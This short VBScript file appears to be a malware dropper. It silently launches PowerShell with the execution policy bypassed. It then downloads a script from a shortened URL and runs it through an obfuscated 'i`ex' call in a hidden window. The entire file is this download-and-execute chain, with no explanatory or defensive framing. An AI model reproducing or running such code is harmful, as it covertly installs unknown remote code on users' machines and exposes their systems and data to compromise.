Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -Ep Bypass -C irm https://is.gd/winidiot | i`ex", 0, True

